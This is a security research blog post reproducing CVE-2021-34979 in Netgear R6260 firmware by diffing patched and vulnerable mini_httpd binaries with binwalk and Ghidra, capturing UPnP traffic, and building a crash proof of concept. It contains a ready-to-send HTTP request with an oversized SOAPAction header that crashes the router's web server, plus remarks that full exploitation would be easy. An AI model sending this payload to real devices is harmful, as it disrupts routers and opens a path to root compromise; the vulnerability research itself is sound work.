---
layout: posts
title:  "Reverse Engineering a Netgear Nday"
date:   2022-03-13 00:00:00 -0600
categories: netgear nday
author: Nicholas Starke
---

CVE-ID: **CVE-2021-34979**
ZDI Identifier: **ZDI-CAN-13512**

This post will detail how I went about developing a proof of concept for a Netgear Nday vulnerability.  I didn't develop this into a full exploit because it would have taken longer and required more resources. For example, writing the full exploit probably requires a debug environment, either on actual hardware or in a virtual setting.  I did most of this work in under two hours, and I decided to stop there.

This vulnerability was disclosed on ZDI: [https://www.zerodayinitiative.com/advisories/ZDI-CAN-13512/](https://www.zerodayinitiative.com/advisories/ZDI-CAN-13512/).  Props to the original researchers for finding a really cool, high impact vulnerability.  To be clear though, I had nothing to do with the discovery of this vulnerability.  I just developed a proof of concept based on the information in the ZDI Link.

The most important part of the ZDI write up is this:

>The specific flaw exists within the handling of SOAP requests. When parsing the SOAPAction header, the process does not properly validate the length of user-supplied data prior to copying it to a fixed-length buffer. An attacker can leverage this vulnerability to execute code in the context of root.

The ZDI write up then goes on to share the Netgear disclosure ([https://kb.netgear.com/000064261/Security-Advisory-for-Vertical-Privilege-Escalation-on-Some-Routers-PSV-2021-0152](https://kb.netgear.com/000064261/Security-Advisory-for-Vertical-Privilege-Escalation-on-Some-Routers-PSV-2021-0152)), which states that the fixed version for the R6260:

>R6260, fixed in firmware version 1.1.0.84

So to sum up what we know so far about this vulnerability:

* Pre-authentication
* Stack-based buffer overflow
* Relates to the **SOAPAction** HTTP Request Header
* Fixed in version **1.1.0.84**

The next step is to download both the **1.1.0.84** firmware and the last vulnerable firmware version, which is the version before **1.1.0.84**.  This turns out to be **1.1.0.78**.

Once I have both firmware versions, I run `binwalk -eM $FIRMWARE_FILE` on both images.  Binwalk will recursively extract the concents of the firmware images.  After the firmware images are both extracted, I need to find which files contain the **SOAPAction** HTTP header.

```
$ grep -r "SOAPAction" .
Binary file ./R6260-V1.1.0.84_1.0.1/_R6260-V1.1.0.84_1.0.1.img.extracted/_R6260.bin.extracted/squashfs-root-0/usr/sbin/minidlna matches
Binary file ./R6260-V1.1.0.84_1.0.1/_R6260-V1.1.0.84_1.0.1.img.extracted/_R6260.bin.extracted/squashfs-root-0/usr/sbin/miniupnpd matches
Binary file ./R6260-V1.1.0.84_1.0.1/_R6260-V1.1.0.84_1.0.1.img.extracted/_R6260.bin.extracted/squashfs-root-0/usr/sbin/miniupnpd_wsc matches
Binary file ./R6260-V1.1.0.84_1.0.1/_R6260-V1.1.0.84_1.0.1.img.extracted/_R6260.bin.extracted/squashfs-root-0/usr/sbin/mini_httpd matches
Binary file ./R6260_V1.1.0.78_1.0.1/_R6260_V1.1.0.78_1.0.1.img.extracted/_R6260.bin.extracted/squashfs-root-0/usr/sbin/minidlna matches
Binary file ./R6260_V1.1.0.78_1.0.1/_R6260_V1.1.0.78_1.0.1.img.extracted/_R6260.bin.extracted/squashfs-root-0/usr/sbin/miniupnpd matches
Binary file ./R6260_V1.1.0.78_1.0.1/_R6260_V1.1.0.78_1.0.1.img.extracted/_R6260.bin.extracted/squashfs-root-0/usr/sbin/miniupnpd_wsc matches
Binary file ./R6260_V1.1.0.78_1.0.1/_R6260_V1.1.0.78_1.0.1.img.extracted/_R6260.bin.extracted/squashfs-root-0/usr/sbin/mini_httpd matches
```

This tells me that for both the last vulnerable version (**1.1.0.78**) and the first fixed version (**1.1.0.84**) there are four files which contain the strings **SOAPAction**:

* minidlna
* miniupnpd
* miniupnpd_wsc
* mini_httpd

The ZDI entry explicitly calls out **mini_httpd** so we don't have to explore the other binaries to reproduce the vulnerability detailed in the ZDI link.  It is good we have confirmed though that the **SOAPAction** string occurs in the **mini_httpd** binary, and not in some shared library linked in to the Webserver.

Next I open up both versions of **mini_httpd** in Ghidra and do a string search for **SOAPAction**:

![Ghidra String Search](/images/03132022/ghidra-string-search.png "Screenshot of ghidra string search")

We can see that there is only one time **SOAPAction** occurs in the binary by checking the references to this string:

![Ghidra String References](/images/03132022/ghidra-string-references.png "Screenshot of ghidra string references")

This leads us to the following code:

## Version 1.1.0.78

```cpp
[...]
    iVar4 = strncasecmp(pcVar8,"SOAPAction:",0xb);
    if (iVar4 == 0) {
        sVar10 = strspn(pcVar8 + 0xb," \t");
        pcVar8 = strcasestr(pcVar8 + 0xb + sVar10,"urn:NETGEAR-ROUTER:service:" )
        ;
        pcVar11 = pcVar8 + 0x1b;
        if (pcVar8 != (char *)0x0) {
            iVar4 = 0;
            for (; (cVar1 = *pcVar11, cVar1 != ':' && (cVar1 != '\0'));
                pcVar11 = pcVar11 + 1) {
                (&DAT_0042a9f8)[iVar4] = cVar1;
                iVar4 = iVar4 + 1;
            }
            pcVar8 = strchr(pcVar11,0x23);
            if ((pcVar8 != (char *)0x0) && (pcVar8[1] != '\0')) {
                snprintf(&DAT_0042aa78,0x80,"%s",pcVar8 + 1);
            }
            (&DAT_0042a9f8)[iVar4] = 0;
            DAT_0042aaf8 = 1;
        }
    }
 [...]                       
```

## Version 1.1.0.84

```cpp
[...]
    iVar4 = strncasecmp(pcVar8,"SOAPAction:",0xb);
    if (iVar4 == 0) {
        sVar10 = strspn(pcVar8 + 0xb," \t");
        pcVar8 = strcasestr(pcVar8 + 0xb + sVar10,"urn:NETGEAR-ROUTER:service:" )
        ;
        pcVar17 = pcVar8 + 0x1b;
            if (pcVar8 != (char *)0x0) {
                iVar4 = 0;
                for (; (cVar1 = *pcVar17, cVar1 != ':' && (cVar1 != '\0'));
                    pcVar17 = pcVar17 + 1) {
                    if (iVar4 == 0x80) goto LAB_00020184;
                    (&DAT_0003e888)[iVar4] = cVar1;
                    iVar4 = iVar4 + 1;
                }
                pcVar8 = strchr(pcVar17,0x23);
                if ((pcVar8 != (char *)0x0) && (pcVar8[1] != '\0')) {
                    snprintf(&DAT_0003e908,0x80,"%s",pcVar8 + 1);
                }
                (&DAT_0003e888)[iVar4] = 0;
                DAT_0003e988 = 1;
                
            }
        }
[...]
```
*For disassembly see Appendix A*

It looks like a length check has been added to **1.1.0.84**:
>  if (iVar4 == 0x80) goto LAB_00020184;

What is **iVar4** mean in this case? Reading through the rest of the decompiler output, it seems to be the index in a string before the **#** character.  This will become important later.  

What do we know at this point?

* **mini_httpd** accepts a **SOAPAction** header that is then performs some parsing of.  
* The **SOAPAction** parser expects the value of the **SOAPAction** header to contain **"urn:NETGEAR-ROUTER:service:"**
* The parser then looks for the UPNP Service name after the aforementioned string, to be delimited with the **#** character.  
* The parser then attempts to write at a memory address defined by the length of the above service name string, without any length checking.
* (In the case of **1.1.0.84**) A length check of **128** (**0x80**) has been added.

My next step was to generate some example SOAP Traffic that I can then manipulate.  To create this traffic, I used `miranda-upnp` ([https://github.com/0x90/miranda-upnp](https://github.com/0x90/miranda-upnp)).  I unfortunately do not have a Burp Suite license for my personal use, so I use **ZAProxy** ([https://www.zaproxy.org/](https://www.zaproxy.org/)) to capture the SOAP Traffic.

One of the things that we have to do to capture the miranda traffic in ZAProxy is to force miranda to use ZAProxy as an upstream proxy.  We can do this with **proxychains** fairly easily. This is what my proxychains config looks like:

![Proxychains Config](/images/03132022/proxychains-config.png "Screenshot of proxy chains config")

In this image, **192.168.1.2:8080** is where ZAproxy is running.  Next we can start up miranda like this:

```
$ sudo proxychains4 python2 miranda.py
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15

Miranda v1.3
The interactive UPnP client
Craig Heffner, http://www.devttys0.com

upnp> 

```

At the **upnp>** prompt we want to search for active UPNP traffic:

```
upnp> msearch

Entering discovery mode for 'upnp:rootdevice', Ctl+C to stop...

****************************************************************
SSDP reply message from 192.168.1.1:56688
XML file is located at http://192.168.1.1:56688/rootDesc.xml
Device is running Unspecified, UPnP/1.0, Unspecified
****************************************************************

^C
Discover mode halted...
```

Next we need to get the host info:

```
upnp> host get 0

Requesting device and service info for 192.168.1.1:56688 (this could take a few seconds)...

[proxychains] Strict chain  ...  192.168.1.2:8080  ...  192.168.1.1:56688  ...  OK
[proxychains] Strict chain  ...  192.168.1.2:8080  ...  192.168.1.1:56688  ...  OK
[proxychains] Strict chain  ...  192.168.1.2:8080  ...  192.168.1.1:56688  ...  OK
[proxychains] Strict chain  ...  192.168.1.2:8080  ...  192.168.1.1:56688  ...  OK
[proxychains] Strict chain  ...  192.168.1.2:8080  ...  192.168.1.1:56688  ...  OK
[proxychains] Strict chain  ...  192.168.1.2:8080  ...  192.168.1.1:56688  ...  OK
[proxychains] Strict chain  ...  192.168.1.2:8080  ...  192.168.1.1:56688  ...  OK
Host data enumeration complete!
```

Now to generate the example traffic:

```
upnp> host send 0 LANDevice LANHostConfigManagement GetDomainName                                                                                                                                          
                                                                                                                                                                                                           
[proxychains] Strict chain  ...  192.168.1.2:8080  ...  192.168.1.1:56688  ...  OK                                                                                                                         
NewDomainName :                                                                                                                                                                                            
```

And then we should see some example traffic in ZAProxy:

![ZAProxy Example Soap](/images/03132022/zaproxy-example-soap.png "Screenshot of ZAProxy SOAP Example HTTP Request")

Now we need to modify this example traffic to meet our constraints.

* This example traffic is not directed toward the webserver on port 80, thus it is not sending traffic to **mini_httpd**. We need to remove the references to port **56688**.
* We then need to change the **SOAPAction* HTTP request header to match our constraints.

In the example trafic:
>SOAPAction: "urn:schemas-upnp-org:service:LANHostConfigManagement:1#GetDomainName"

Needs to be modified to:
>SOAPAction: "urn:NETGEAR-ROUTER:service:$PAYLOAD:1#GetDomainName"

Where **$PAYLOAD** is 1024 "A" characters.

## Proof of Concept Example HTTP request

```
POST http://192.168.1.1/setup.cgi HTTP/1.1
SOAPAction: "urn:NETGEAR-ROUTER:service:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:1#GetDomainName"
Host: 192.168.1.1
Content-Type: text/xml
Content-Length: 326

<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
	<m:GetDomainName xmlns:m="urn:schemas-upnp-org:service:LANHostConfigManagement:1">

	</m:GetDomainName>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

Ensure there is no **Cookie** header being sent with the HTTP request.

This request results in this ZAP Error message:

![ZAProxy Error](/images/03132022/zaproxy-error.png "ZAProxy Error")

In general terms this means the HTTP request has segfaulted the **mini_httpd** process running on the router so that no response was sent back.  Changing the **$PAYLOAD** value to something like **AAAA** results in a valid response being returned.  

The final test is to see if updating the firmware to version **1.1.0.84** allows the same request to return a valid HTTP response and not crash the webserver. When I tested this scenario I was pleased to see I received a valid HTTP response when making the same request.  There ya go.

## Developing an exploit

I don't think the exploit piece of this would be too difficult to create.  There are no binary hardening protections in place at compile time on the **mini_httpd** binary, significantly lowering the difficulty of exploitation.  

## Appendix A: Disassembly

**1.1.0.78**

```
                             LAB_0040af94                                    XREF[1]:     0040af64 (j)   
        0040af94 8c  82  99  8f    lw         t9,-0x7d74 (gp)=>-><EXTERNAL>::strncasecmp       = 00413550
        0040af98 41  00  05  3c    lui        a1,0x41
        0040af9c 10  4e  a5  24    addiu      a1=>s_SOAPAction:_00414e10 ,a1,0x4e10            = "SOAPAction:"
        0040afa0 09  f8  20  03    jalr       t9=><EXTERNAL>::strncasecmp                      int strncasecmp(char * __s1, cha
        0040afa4 0b  00  06  24    _li        a2,0xb
        0040afa8 28  00  bc  8f    lw         gp,local_53d8 (sp)
        0040afac 3b  00  40  14    bne        v0,zero ,LAB_0040b09c
        0040afb0 0b  00  b5  26    _addiu     s5,s5,0xb
        0040afb4 04  83  99  8f    lw         t9,-0x7cfc (gp)=>-><EXTERNAL>::strspn            = 00413390
        0040afb8 41  00  05  3c    lui        a1,0x41
        0040afbc 21  20  a0  02    move       a0,s5
        0040afc0 09  f8  20  03    jalr       t9=><EXTERNAL>::strspn                           size_t strspn(char * __s, char *
        0040afc4 9c  42  a5  24    _addiu     a1=>DAT_0041429c ,a1,0x429c                      = 20h     
        0040afc8 28  00  bc  8f    lw         gp,local_53d8 (sp)
        0040afcc 41  00  05  3c    lui        a1,0x41
        0040afd0 21  20  a2  02    addu       a0,s5,v0
        0040afd4 90  81  99  8f    lw         t9,-0x7e70 (gp)=>-><EXTERNAL>::strcasestr        = 00413910
        0040afd8 00  00  00  00    nop
        0040afdc 09  f8  20  03    jalr       t9=><EXTERNAL>::strcasestr                       char * strcasestr(char * __hayst
        0040afe0 1c  4e  a5  24    _addiu     a1=>s_urn:NETGEAR-ROUTER:service:_00414e1c ,a1  = "urn:NETGEAR-ROUTER:service:"
        0040afe4 28  00  bc  8f    lw         gp,local_53d8 (sp)
        0040afe8 2c  00  40  10    beq        v0,zero ,LAB_0040b09c
        0040afec 1b  00  44  24    _addiu     a0,v0,0x1b
        0040aff0 21  a8  00  00    clear      s5
        0040aff4 3a  00  05  24    li         a1,0x3a
        0040aff8 03  2c  10  08    j          LAB_0040b00c
        0040affc f8  a9  e3  26    _addiu     v1,s7,-0x5608
                             LAB_0040b000                                    XREF[1]:     0040b01c (j)   
        0040b000 00  00  c2  a0    sb         v0,0x0 (a2)=>DAT_0042a9f8                        = ??
        0040b004 01  00  b5  26    addiu      s5,s5,0x1
        0040b008 01  00  84  24    addiu      a0,a0,0x1
                             LAB_0040b00c                                    XREF[1]:     0040aff8 (j)   
        0040b00c 00  00  82  80    lb         v0,0x0 (a0)
        0040b010 00  00  00  00    nop
        0040b014 03  00  45  10    beq        v0,a1,LAB_0040b024
        0040b018 00  00  00  00    _nop
        0040b01c f8  ff  40  14    bne        v0,zero ,LAB_0040b000
        0040b020 21  30  75  00    _addu      a2=>DAT_0042a9f8 ,v1,s5                          = ??
                             LAB_0040b024                                    XREF[1]:     0040b014 (j)   
        0040b024 50  81  99  8f    lw         t9,-0x7eb0 (gp)=>-><EXTERNAL>::strchr            = 00413a00
        0040b028 00  00  00  00    nop
        0040b02c 09  f8  20  03    jalr       t9=><EXTERNAL>::strchr                           char * strchr(char * __s, int __
        0040b030 23  00  05  24    _li        a1,0x23
        0040b034 28  00  bc  8f    lw         gp,local_53d8 (sp)
        0040b038 0e  00  40  10    beq        v0,zero ,LAB_0040b074
        0040b03c 43  00  03  3c    _lui       v1,0x43
        0040b040 01  00  43  80    lb         v1,0x1 (v0)
        0040b044 00  00  00  00    nop
        0040b048 0a  00  60  10    beq        v1,zero ,LAB_0040b074
        0040b04c 43  00  03  3c    _lui       v1,0x43
        0040b050 a0  82  99  8f    lw         t9,-0x7d60 (gp)=>-><EXTERNAL>::snprintf          = 00413510
        0040b054 43  00  04  3c    lui        a0,0x43
        0040b058 42  00  06  3c    lui        a2,0x42
        0040b05c 78  aa  84  24    addiu      a0=>DAT_0042aa78 ,a0,-0x5588                     = ??
        0040b060 80  00  05  24    li         a1,0x80
        0040b064 58  81  c6  24    addiu      a2=>s_%s_00418138+32 ,a2,-0x7ea8                 = "%s"
        0040b068 09  f8  20  03    jalr       t9=><EXTERNAL>::snprintf                         int snprintf(char * __s, size_t 
        0040b06c 01  00  47  24    _addiu     a3,v0,0x1
        0040b070 43  00  03  3c    lui        v1,0x43
                             LAB_0040b074                                    XREF[2]:     0040b038 (j) , 0040b048 (j)   
        0040b074 f8  a9  63  24    addiu      v1,v1,-0x5608
        0040b078 21  a8  a3  02    addu       s5,s5,v1
        0040b07c 43  00  02  3c    lui        v0,0x43
        0040b080 01  00  03  24    li         v1,0x1
        0040b084 00  00  a0  a2    sb         zero ,0x0 (s5)=>DAT_0042a9f8                      = ??
        0040b088 27  2c  10  08    j          LAB_0040b09c
        0040b08c f8  aa  43  ac    _sw        v1,-0x5508 (v0)=>DAT_0042aaf8                    = ??
```

**1.1.0.84**
```
                             LAB_0001d2fc                                    XREF[1]:     0001d2c8 (j)   
        0001d2fc 30  80  85  8f    lw         a1,-0x7fd0 (gp)=>PTR_DAT_0003d140                = 00030000
        0001d300 fc  82  99  8f    lw         t9,-0x7d04 (gp)=>-><EXTERNAL>::strncasecmp       = 00026710
        0001d304 20  80  a5  24    addiu      a1=>s_SOAPAction:_00028020 ,a1,-0x7fe0           = "SOAPAction:"
        0001d308 09  f8  20  03    jalr       t9=><EXTERNAL>::strncasecmp                      int strncasecmp(char * __s1, cha
        0001d30c 0b  00  06  24    _li        a2,0xb
        0001d310 28  00  bc  8f    lw         gp,local_5438 (sp)
        0001d314 43  00  40  14    bne        v0,zero ,LAB_0001d424
        0001d318 0b  00  f7  26    _addiu     s7,s7,0xb
        0001d31c 38  80  85  8f    lw         a1,-0x7fc8 (gp)=>PTR_LAB_0003d148                = 00020000
        0001d320 78  83  99  8f    lw         t9,-0x7c88 (gp)=>-><EXTERNAL>::strspn            = 00026550
        0001d324 21  20  e0  02    move       a0,s7
        0001d328 09  f8  20  03    jalr       t9=><EXTERNAL>::strspn                           size_t strspn(char * __s, char *
        0001d32c ac  74  a5  24    _addiu     a1=>DAT_000274ac ,a1,0x74ac                      = 20h     
        0001d330 28  00  bc  8f    lw         gp,local_5438 (sp)
        0001d334 21  20  e2  02    addu       a0,s7,v0
        0001d338 30  80  85  8f    lw         a1,-0x7fd0 (gp)=>PTR_DAT_0003d140                = 00030000
        0001d33c fc  81  99  8f    lw         t9,-0x7e04 (gp)=>-><EXTERNAL>::strcasestr        = 00026ae0
        0001d340 00  00  00  00    nop
        0001d344 09  f8  20  03    jalr       t9=><EXTERNAL>::strcasestr                       char * strcasestr(char * __hayst
        0001d348 2c  80  a5  24    _addiu     a1=>s_urn:NETGEAR-ROUTER:service:_0002802c ,a1  = "urn:NETGEAR-ROUTER:service:"
        0001d34c 28  00  bc  8f    lw         gp,local_5438 (sp)
        0001d350 34  00  40  10    beq        v0,zero ,LAB_0001d424
        0001d354 1b  00  44  24    _addiu     a0,v0,0x1b
        0001d358 21  b8  00  00    clear      s7
        0001d35c 3a  00  06  24    li         a2,0x3a
        0001d360 80  00  05  24    li         a1,0x80
        0001d364 0c  00  00  10    b          LAB_0001d398
        0001d368 88  e8  c3  27    _addiu     v1,s8,-0x1778
                             LAB_0001d36c                                    XREF[1]:     0001d3a8 (j)   
        0001d36c 06  00  e5  16    bne        s7,a1,LAB_0001d388
        0001d370 00  00  00  00    _nop
        0001d374 38  80  85  8f    lw         a1,-0x7fc8 (gp)=>PTR_LAB_0003d148                = 00020000
        0001d378 94  01  04  24    li         a0,0x194
        0001d37c 90  74  06  26    addiu      a2,s0,0x7490
        0001d380 80  0b  00  10    b          LAB_00020184
        0001d384 7c  73  a5  24    _addiu     a1,a1,0x737c
                             LAB_0001d388                                    XREF[1]:     0001d36c (j)   
        0001d388 21  38  77  00    addu       a3,v1,s7
        0001d38c 00  00  e2  a0    sb         v0,0x0 (a3)=>DAT_0003e888                        = ??
        0001d390 01  00  f7  26    addiu      s7,s7,0x1
        0001d394 01  00  84  24    addiu      a0,a0,0x1
                             LAB_0001d398                                    XREF[1]:     0001d364 (j)   
        0001d398 00  00  82  80    lb         v0,0x0 (a0)
        0001d39c 00  00  00  00    nop
        0001d3a0 03  00  46  10    beq        v0,a2,LAB_0001d3b0
        0001d3a4 00  00  00  00    _nop
        0001d3a8 f0  ff  40  14    bne        v0,zero ,LAB_0001d36c
        0001d3ac 00  00  00  00    _nop
                             LAB_0001d3b0                                    XREF[1]:     0001d3a0 (j)   
        0001d3b0 b0  81  99  8f    lw         t9,-0x7e50 (gp)=>-><EXTERNAL>::strchr            = 00026c00
        0001d3b4 00  00  00  00    nop
        0001d3b8 09  f8  20  03    jalr       t9=><EXTERNAL>::strchr                           char * strchr(char * __s, int __
        0001d3bc 23  00  05  24    _li        a1,0x23
        0001d3c0 28  00  bc  8f    lw         gp,local_5438 (sp)
        0001d3c4 0e  00  40  10    beq        v0,zero ,LAB_0001d400
        0001d3c8 00  00  00  00    _nop
        0001d3cc 01  00  43  80    lb         v1,0x1 (v0)
        0001d3d0 00  00  00  00    nop
        0001d3d4 0a  00  60  10    beq        v1,zero ,LAB_0001d400
        0001d3d8 80  00  05  24    _li        a1,0x80
        0001d3dc 24  80  84  8f    lw         a0,-0x7fdc (gp)=>PTR_DAT_0003d134                = 00040000
        0001d3e0 30  80  86  8f    lw         a2,-0x7fd0 (gp)=>PTR_DAT_0003d140                = 00030000
        0001d3e4 10  83  99  8f    lw         t9,-0x7cf0 (gp)=>-><EXTERNAL>::snprintf          = 000266d0
        0001d3e8 08  e9  84  24    addiu      a0=>DAT_0003e908 ,a0,-0x16f8                     = ??
        0001d3ec 40  b3  c6  24    addiu      a2=>s_%s_0002b320+32 ,a2,-0x4cc0                 = "%s"
        0001d3f0 09  f8  20  03    jalr       t9=><EXTERNAL>::snprintf                         int snprintf(char * __s, size_t 
        0001d3f4 01  00  47  24    _addiu     a3,v0,0x1
        0001d3f8 28  00  bc  8f    lw         gp,local_5438 (sp)
        0001d3fc 00  00  00  00    nop
                             LAB_0001d400                                    XREF[2]:     0001d3c4 (j) , 0001d3d4 (j)   
        0001d400 24  80  83  8f    lw         v1,-0x7fdc (gp)=>PTR_DAT_0003d134                = 00040000
        0001d404 24  80  82  8f    lw         v0,-0x7fdc (gp)=>PTR_DAT_0003d134                = 00040000
        0001d408 88  e8  63  24    addiu      v1,v1,-0x1778
        0001d40c 21  b8  e3  02    addu       s7,s7,v1
        0001d410 01  00  03  24    li         v1,0x1
        0001d414 00  00  e0  a2    sb         zero ,0x0 (s7)=>DAT_0003e888                      = ??
        0001d418 02  00  00  10    b          LAB_0001d424
        0001d41c 88  e9  43  ac    _sw        v1,-0x1678 (v0)=>DAT_0003e988                    = ??
                             LAB_0001d420                                    XREF[1]:     0001ced8 (j)   
        0001d420 24  80  9e  8f    lw         s8,-0x7fdc (gp)=>PTR_DAT_0003d134                = 00040000
                             LAB_0001d424                                    XREF[12]:    0001cff0 (j) , 0001d054 (j) , 
                                                                                          0001d0a8 (j) , 0001d100 (j) , 
                                                                                          0001d174 (j) , 0001d1ec (j) , 
                                                                                          0001d260 (j) , 0001d2a8 (j) , 
                                                                                          0001d2f4 (j) , 0001d314 (j) , 
                                                                                          0001d350 (j) , 0001d418 (j)   
        0001d424 34  80  82  8f    lw         v0,-0x7fcc (gp)=>PTR_0003d144                    = 00000000
```